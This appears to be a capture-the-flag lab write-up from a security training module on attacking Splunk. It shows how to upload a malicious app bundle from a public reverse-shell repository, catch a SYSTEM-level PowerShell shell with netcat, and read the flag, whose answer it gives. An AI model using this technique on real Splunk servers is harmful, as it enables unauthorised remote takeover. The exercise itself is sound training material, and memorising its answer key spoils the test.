# Section 14: Attacking Splunk

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.

Context:
- Clone the repository `https://github.com/0xjpuff/reverse_shell_splunk`
- Change the `attacker_ip` and `attacker_port` in `bin/rev.py` and `bin/run.ps1`
- Create archive and upload it to get RCE and the flag:
```bash
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-aksnyadptc-htb-cloud-com]─[~/reverse_shell_splunk]
└──╼ [★]$ tar -cvzf updater.tar.gz reverse_shell_splunk/
reverse_shell_splunk/
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-aksnyadptc-htb-cloud-com]─[~/reverse_shell_splunk]
└──╼ [★]$ ls
README.md  reverse_shell_splunk  updater.tar.gz
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-aksnyadptc-htb-cloud-com]─[~/reverse_shell_splunk]
└──╼ [★]$ nc -lvnp 4443
Listening on 0.0.0.0 4443
Connection received on 10.129.201.50 51209
id
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> dir c:\loot


    Directory: C:\loot


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/29/2021   6:16 PM             16 flag.txt                                                              


PS C:\Windows\system32> type c:\loot\flag.txt
l00k_ma_no_AutH!
PS C:\Windows\system32> 
```

**Answer:** `l00k_ma_no_AutH!`

---

[Back to Module Index](./README.md)